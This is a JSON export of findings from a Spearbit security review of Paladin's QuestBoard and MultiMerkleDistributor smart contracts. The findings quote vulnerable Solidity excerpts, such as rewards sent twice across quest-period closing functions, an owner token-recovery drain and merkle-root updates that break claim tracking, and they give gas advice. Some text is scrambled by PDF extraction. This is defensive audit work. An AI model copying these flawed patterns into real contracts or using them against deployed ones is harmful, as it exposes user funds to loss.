[{"title": "Verify user has indeed voted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "If an error is made in the merkle trees (either by accident or on purpose) a user that did not vote (in that period for that gauge) might get rewards assigned to him. Although the Paladin documentation says: \"the Curve DAO contract does not offer a mapping of votes for each Gauge for each Period\", it might still be possible to verify that a user has voted if the account, gauge and period are known. Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Tokens could be sent / withdrawn multiple times by accident", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions closeQuestPeriod() and closePartOfQuestPeriod() have similar functionality but in- terfere with each other. 1. Suppose you have closed the first quest of a period via closePartOfQuestPeriod(). Now you cannot use closeQuestPeriod() to close the rest of the periods, as closeQuestPeriod() checks the state of the first quest. 2. Suppose you have closed the second quest of a period via closePartOfQuestPeriod(), but closeQuest- Period() continues to work. It will close the second quest again and send the rewards of the second quest to the distributor, again. Also, function closeQuestPeriod() sets the withdrawableAmount value one more time, so the creator can do withdrawUnusedRewards() once more. Although both closeQuestPeriod() and closePartOfQuestPeriod() are authorized, the problems above could occur by accident. Additionally there is a lot of code duplication between closeQuestPeriod() and closePartOfQuestPeriod(), with a high risk of issues with future code changes. 5 function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... // We use the 1st QuestPeriod of this period to check it was not Closed uint256[] memory questsForPeriod = questsByPeriod[period]; require( ,! periodsByQuest[questsForPeriod[0]][period].currentState == PeriodState.ACTIVE, // only checks first period \"QuestBoard: Period already closed\" ); ... // no further checks on currentState _questPeriod.withdrawableAmount = .... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // sends tokens (again) ... } // sets withdrawableAmount (again) function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ,! ... _questPeriod.currentState = PeriodState.CLOSED; ... _questPeriod.withdrawableAmount = _questPeriod.rewardAmountPerPeriod - toDistributeAmount; IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); ... } Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Limit possibilities of recoverERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract MultiMerkleDistributor.sol allows the retrieval of all ERC20 tokens from the MultiMerkleDistributor.sol whereas the comment indicates it is only meant to retrieve those tokens that have been sent by mistake. Allowing to retrieve all tokens also enables the retrieval of legitimate ones. This way rewards cannot be collected anymore. It could be seen as allowing a rug pull by the project and should be avoided. In contrast, function recoverERC20() in contract QuestBoard.sol does prevent whitelisted tokens from being re- trieved. Note: The project could also add a merkle tree that allows for the retrieval of legitimate tokens to their own addresses. 6 * @notice Recovers ERC2O tokens sent by mistake to the contract contract MultiMerkleDistributor is Ownable { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; } } contract QuestBoard is Ownable, ReentrancyGuard { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Updating QuestBoard in MultiMerkleDistributor.sol will not work", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Updating QuestManager/ QuestBoard in MultiMerkleDistributor.sol will give the following issue: If the newQuestBoard uses the current implementation of QuestBoard.sol, it will start with questId == 0 again, thus attempting to overwrite previous quests. function updateQuestManager(address newQuestBoard) external onlyOwner { questBoard = newQuestBoard; }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Old quests can be extended via increaseQuestDuration()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function increaseQuestDuration() does not check if a quest is already in the past. Extending a quest from the past in duration is probably not useful. It also might require additional calls to closePartOfQuest- Period(). function increaseQuestDuration(...) ... { updatePeriod(); ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... uint256 periodIterator = ((lastPeriod + WEEK) / WEEK) * WEEK; ... for(uint256 i = 0; i < addedDuration;){ ... periodsByQuest[questID][periodIterator]....= ... periodIterator = ((periodIterator + WEEK) / WEEK) * WEEK; unchecked{ ++i; } } ... }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Accidental call of addQuest could block contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The addQuest() function uses an onlyAllowed access control modifier. This modifier checks if msg.sender is questBoard or owner. However, the QuestBoard.sol contract has a QuestID registration and a token whitelisting mechanism which should be used in combination with addQuest() function. If owner accidentally calls addQuest(), the QuestBoard.sol contract will not be able to call addQuest() for that questID. As soon as createQuest() tries to add that same questID the function will revert, becoming uncallable because nextID still maintains that same value. function createQuest(...) ... { ... uint256 newQuestID = nextID; nextID += 1; ... require(MultiMerkleDistributor(distributor).addQuest(newQuestID, rewardToken), \"QuestBoard: Fail add to Distributor\"); ... ,! } 8 function addQuest(uint256 questID, address token) external onlyAllowed returns(bool) { require(questRewardToken[questID] == address(0), \"MultiMerkle: Quest already listed\"); require(token != address(0), \"MultiMerkle: Incorrect reward token\"); // Add a new Quest using the QuestID, and list the reward token for that Quest questRewardToken[questID] = token; emit NewQuest(questID, token); return true; } Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Reduce impact of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function emergencyUpdatequestPeriod() allows the merkle tree to be updated. The merkle tree contains an embedded index parameter which is used to prevent double claims. When the merkleRoot is updated, the layout of indexes in the merkle tree could become different. Example: Suppose the initial merkle tree contains information for: - user A: index=1, account = 0x1234, amount=100 - user B: index=2, account = 0x5689, amount=200 Then user A claims => _setClaimed(..., 1) is set. Now it turns out a mistake is made with the merkle tree, and it should contain: - user B: index=1, account = 0x5689, amount=200 - user C: index=2, account = 0xabcd, amount=300 Now user B will not be able to claim because bit 1 has already been set. Under this situation the following issues can occur:  Someone who has already claimed might be able to claim again.  Someone who has already claimed has too much.  Someone who has already claimed has too little, and cannot longer claim the rest because _setClaimed() has already been set.  someone who has not yet claimed might not be able to claim because _setClaimed() has already been set by another user. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Verify the correct merkle tree is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the merkle tree belongs to the right quest and period. If the wrong merkle tree is added then the wrong rewards can be claimed. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Prevent mixing rewards from different quests and periods", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the sum of all amounts in the merkle tree are equal to the rewards allocated for that quest and for that period. This could happen if there is a bug in the merkle tree creation script. If the sum of the amounts is too high, then tokens from other quests or other periods could be claimed, which will give problems later on, when claims are done for the other quest/periods. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Nonexistent zero address check for newQuestBoard in updateQuestManager function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Nonexistent zero address check for newQuestBoard in updateQuestManager function. Assigning newQuestBoard to a zero address may cause unintended behavior.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Verify period is always a multiple of week", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The calculations with period assume that period is a multiple of WEEK. However, period is often assigned as a parameter and not verified if it is a multiple of WEEK. This calculation may cause unexpected results. Note: When it is verified that period is a multiple of WEEK, the following calculation can be simplified: - int256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; + int256 nextPeriod = period + WEEK; The following function does not explicitly verify that period is a multiple of WEEK. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... uint256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; ... } function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { ... } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) ... { ... } function addMerkleRoot(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function addMultipleMerkleRoot(..., uint256 period, ...) external isAlive onlyAllowed nonReentrant { ... } ,! function claim(..., uint256 period, ...) public { ... } function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function claimQuest(address account, uint256 questID, ClaimParams[] calldata claims) external { ,! ... // also uses period as part of the claims array require(questMerkleRootPerPeriod[claims[i].questID][claims[i].period] != 0, \"MultiMerkle: not updated yet\"); require(!isClaimed(questID, claims[i].period, claims[i].index), \"MultiMerkle: already claimed\"); ... require( MerkleProof.verify(claims[i].merkleProof, questMerkleRootPerPeriod[questID][claims[i].period], ,! node), \"MultiMerkle: Invalid proof\" ); ... _setClaimed(questID, claims[i].period, claims[i].index); ... emit Claimed(questID, claims[i].period, claims[i].index, claims[i].amount, rewardToken, account); ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk QuestBoard.sol#L201-L203, QuestBoard.sol#L750-L815,"]}, {"title": "Missing safety check to ensure array length does not underflow and revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several functions use questPeriods[questID][questPeriods[questID].length - 1]. The sec- ond value in the questPeriods mapping is questPeriods[questID].length - 1. It is possible for this function to revert if the case arises where questPeriods[questID].length is 0. Looking at the code this is not likely to occur but it is a valid safety check that covers possible strange edge cases. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestDuration(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestReward(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestObjective(... ) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent dual entry point tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract QuestBoard.sol only allows the retrieval of non whitelisted tokens. Recently an issue has been found to circumvent these checks, with so called dual entry point tokens. See a description here: compound-tusd-integration-issue-retrospective function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } 13", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Limit the creation of quests", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getQuestIdsForPeriod() could run out of gas if someone creates an enormous amount of quests. See also: what-is-the-array-size-limit-of-a-returned-array. Note: If this were to happen, the QuestIds can also be retrieved directly from the getter of questsByPeriod(). Note: closeQuestPeriod() has the same problem, but closePartOfQuestPeriod() is a workaround for this. Requiring a minimal amount of tokens to create a quest can limit the number of quests. The minimum number of tokens to pay is: duration * minObjective * minRewardPerVotePerToken[]. The values of duration and minObjective are least 1, but minRewardPerVotePerToken[] could be 0 and even if minRewardPerVotePerToken is non zero but still low, the number of tokes required is neglectable when using tokens with 18 decimals. Requiring a minimum amount of tokens also helps to prevent the creation of spam quests. 14 function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { return questsByPeriod[period]; // could run out of gas } function createQuest(...) { ... require(duration > 0, \"QuestBoard: Incorrect duration\"); require(objective >= minObjective, \"QuestBoard: Objective too low\"); ... require(rewardPerVote >= minRewardPerVotePerToken[rewardToken], \"QuestBoard: RewardPerVote too low\"); ... vars.rewardPerPeriod = (objective * rewardPerVote) / UNIT; // can be 0 ==> totalRewardAmount can be 0 require((totalRewardAmount * platformFee)/MAX_BPS == feeAmount, \"QuestBoard: feeAmount incorrect\"); // feeAmount can be 0 ... require((vars.rewardPerPeriod * duration) == totalRewardAmount, \"QuestBoard: totalRewardAmount incorrect\"); ... IERC20(rewardToken).safeTransferFrom(vars.creator, address(this), totalRewardAmount); IERC20(rewardToken).safeTransferFrom(vars.creator, questChest, feeAmount); ... ,! ,! ,! ,! } constructor(address _gaugeController, address _chest){ ... minObjective = 1000 * UNIT; // initial value, but can be overwritten ... } function updateMinObjective(uint256 newMinObjective) external onlyOwner { require(newMinObjective > 0, \"QuestBoard: Null value\"); // perhaps set higher minObjective = newMinObjective; } function whitelistToken(address newToken, uint256 minRewardPerVote) public onlyAllowed { // geen isAlive??? ... minRewardPerVotePerToken[newToken] = minRewardPerVote; // no minimum value required ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Non existing states are considered active", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "periods- if a state is checked of a non existing However, ByQuest[questIDs[i]][period] is active. questIDs[i] or a questID that has no quest in that period, then periodsByQuest[questIDs[i]][period] is empty and periodsByQuest[questIDs[i]][period].currentState == 0. closePartOfQuestPeriod() function verifies state the of if As PeriodState.ACTIVE ==0, the stated is considered to be active and the require() doesnt trigger and pro- cessing continues. Luckily as all other values are also 0 (especially _questPeriod.rewardAmountPerPeriod), toDistributeAmount will be 0 and no tokens are sent. However slight future changes in the code might introduce unwanted effects. enum PeriodState { ACTIVE, CLOSED, DISTRIBUTED } // ACTIVE == 0 function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive ,! onlyAllowed nonReentrant { ... for(uint256 i = 0; i < length;){ ... require( periodsByQuest[questIDs[i]][period].currentState == PeriodState.ACTIVE, // doesn't work ,! if questIDs[i] & period are empty \"QuestBoard: Period already closed\" );", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Critical changes should use two-step process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The QuestBoard.sol, QuestTreasureChest.sol and QuestTreasureChest.sol contracts inherit from OpenZeppelins Ownable contract which enables the onlyOwner role to transfer ownership to another address. Its possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. This is an unwanted situation because the owner role is neccesary for several methods.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent accidental call of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions updateQuestPeriod() and emergencyUpdatequestPeriod() are very similar. However, if function emergencyUpdatequestPeriod() is accidentally used instead of updateQuestPeriod(), then period isnt push()ed to the array questClosedPeriods[]. This means function getClosedPeriodsByQuests() will not be able to retreive all the closed periods. function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyAllowed returns(bool) { ... questClosedPeriods[questID].push(period); ... questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyOwner returns(bool) { ... // no push() questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Usage of deprecated safeApprove", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "OpenZeppelin safeApprove implementation is deprecated. Reference. Using this deprecated func- tion can lead to unintended reverts and potential locking of funds. SafeERC20.safeApprove() Insecure Behaviour.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "questID on the NewQuest event should be indexed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The NewQuest event currently does not have questID set to indexed which goes against the pattern set by the other events in the contract where questID is actually indexed.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Add validation checks on addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Missing validation checks on addresses passed into the constructor functions. Adding these checks on _gaugeController and _chest can prevent costly errors the during deployment of the contract. Also in function claim() and claimQuest() there is no zero check for for account argument.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Changing public constant variables to non-public can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several constants are public and thus have a getter function. called from the outside, therefore it is not necessary to make them public. It is unlikely for these values to be", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Using uint instead of bool to optimize gas usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A bool is more costly than uint256. Because each write action generates an additional SLOAD to read the contents of the slot, change the bits occupied by bool and finally write back. contract BooleanTest { mapping(address => bool) approvedManagers; // Gas Cost : 44144 function approveManager(address newManager) external{ approvedManagers[newManager] = true; } mapping(address => uint256) approvedManagersWithoutBoolean; // Gas Cost : 44069 function approveManagerWithoutBoolean(address newManager) external{ approvedManagersWithoutBoolean[newManager] = 1; } }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize && operator usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The check && consumes more gas than using multiple require statements. Example test can be seen below: //Gas Cost: 22515 function increaseQuestReward(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 feeAmount) ,! public { require(newRewardPerVote != 0 && addedRewardAmount != 0 && feeAmount != 0, \"QuestBoard: Null ,! amount\"); } //Gas Cost: 22477 function increaseQuestRewardTest(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 ,! feeAmount) public { require(newRewardPerVote != 0, \"QuestBoard: Null amount\"); require(addedRewardAmount != 0, \"QuestBoard: Null amount\"); require(feeAmount != 0, \"QuestBoard: Null amount\"); } Note : It costs more gas to deploy but it is worth it after X calls. Trade-offs should be considered.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unnecesary value set to 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Since all default values in solidity are already 0 it riod.rewardAmountDistributed = 0; here as it should already be 0. is unnecessary to include _questPe-", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize unsigned integer comparison", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Check != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled. While it may seem that > 0 is cheaper than !=0 this is only true without the optimizer being enabled and outside a require statement. If the optimizer is enabled at 10k and it is in a require statement, it would be more gas efficient.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Use memory instead of storage in closeQuestPeriod() and closePartOfQuestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "In functions closeQuestPeriod() and closePartOfQuestPeriod() a storage pointer _quest is set to quests[questsForPeriod[i]]. This is normally used when write access to the location is need. Nevertheless _quest is read only, to a copy of quests[questsForPeriod[i]] is also sufficient. This can save some gas. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questsForPeriod[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questIDs[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! ,! }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Revert string size optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings using more than 32 bytes require at least one additional mstore, along with additional operations for computing memory offset.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize withdrawUnusedRewards() and emergencyWithdraw() with pointers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "ByQuest[questID][_questPeriods[i]] several times. pointer to read and update values. This will save gas and also make the code more readable. periods- It is possible to set a pointer to this record and use that withdrawUnusedRewards() emergencyWithdraw() Functions and use function withdrawUnusedRewards(uint256 questID, address recipient) external isAlive nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState == PeriodState.ACTIVE) { ... } ... uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } ... } function emergencyWithdraw(uint256 questID, address recipient) external nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState != PeriodState.ACTIVE){ uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } } else { .. totalWithdraw += periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod; periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod = 0; } ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Needless to initialize variables with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "uint256 variables are initialized to a default value of 0 per Solidity docs. Setting a variable to the default value is unnecessary.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize the calculation of the currentPeriod", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The retrieval of currentPeriod is relatively gas expensive because it requires an SLOAD instruction (100 gas) every time. Calculating (block.timestamp / WEEK) * WEEK; is cheaper (TIMESTAMP: 2 gas, MUL: 5 gas, DIV: 5 gas). Refer to evm.codes for more information. Additionally, there is a risk that the call to updatePeriod() is forgotten although it does not happen in the current code. function updatePeriod() public { if (block.timestamp >= currentPeriod + WEEK) { currentPeriod = (block.timestamp / WEEK) * WEEK; } } Note: it is also possible to do all calculations with (block.timestamp / WEEK) instead of (block.timestamp / WEEK) * WEEK, but as the Paladin project has indicated:\"\" This currentPeriod is a timestamp, showing the start date of the current period, and based from the Curve system (because we want the same timestamp they have in the GaugeController).\"", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change memory to calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "For the function parameters, it is often more optimal to have the reference location to be calldata instead of memory. Changing bytes to calldata will decrease gas usage. OpenZeppelin Pull Request", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Caching array length at the beginning of function can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Caching array length at the beginning of the function can save gas in the several locations. function multiClaim(address account, ClaimParams[] calldata claims) external { require(claims.length != 0, \"MultiMerkle: empty parameters\"); uint256 length = claims.length; // if this is done before the require, the require can use \"length\" ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Check amount is greater than 0 to avoid calling safeTransfer() unnecessarily", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A check should be added to make sure amount is greater than 0 to avoid calling safeTransfer() unnecessarily.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unchecked{++i} is more efficient than i++", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getAllQuestPeriodsForQuestId uses i++ which costs more gas than ++i, especially in a loop. Also, the createQuest function uses nextID += 1 which costs more gas than ++nextID. Finally the initialization of i = 0 can be skipped, as 0 is the default value.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Could replace claims[i].questID with questID", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Could replace claims[i].questID with questID (as they are equal due to the check above)", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change function visibility from public to external", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function updateRewardToken of the QuestBoard contract could be set external to save gas and improve code quality.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Functions isClaimed() and _setClaimed() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions isClaimed() and _setClaimed() of the contract MultiMerkleDistributor can be optimized to save gas. See OZ BitMaps for inspiration.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Missing events for owner only functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Use nonReentrant modifier in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions claim(), claimQuest() and recoverERC20() of contract MultiMerkleDistributor send tokens but dont have a nonReentrant modifier. All other functions that send tokens do have this modifier. Note: as the checks & effects patterns is used this is not really necessary. function claim(...) public { ... IERC20(rewardToken).safeTransfer(account, amount); } function claimQuest(...) external { ... IERC20(rewardToken).safeTransfer(account, totalClaimAmount); } function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Place struct definition at the beginning of the contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Regarding Solidity Style Guide, the struct definition can move to the beginning of the contract.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Improve checks for past quests in increaseQuestReward() and increaseQuestObjective()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions increaseQuestReward() and increaseQuestObjective() check: newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote. This is true when the quest is in the past (e.g. currentPeriod is outside of the quest range), because all the values will be 0. Luckily execution is stopped at _getRemainingDuration(questID), however it would be more logical to put this check near the start of the function. function increaseQuestReward(...) ... { updatePeriod(); ... require(newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote, \"QuestBoard: New reward must be higher\"); ... uint256 remainingDuration = _getRemainingDuration(questID); require(remainingDuration > 0, \"QuestBoard: no more incoming QuestPeriods\"); ... ,! } The function _getRemainingDuration() reverts when the quest is in the past, as currentPeriod will be larger than lastPeriod. The is not what you would expect from this function. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; return (lastPeriod - currentPeriod) / WEEK; // can revert }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Should make use of token.balanceOf(address(this)); to recover tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Currently when calling the recoverERC20() function there is no way to calculate what the proper amount should be without having to check the contracts balance of token before hand. This will require an extra step and can be easily done inside the function itself.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Floating pragma is set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The current pragma Solidity directive is ^0.8.10. It is recommended to specify a specific compiler version to ensure that the byte code produced does not vary between builds. Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.8.10) ensures that contracts do not accidentally get deployed using an older compiler version with known compiler bugs.", "labels": 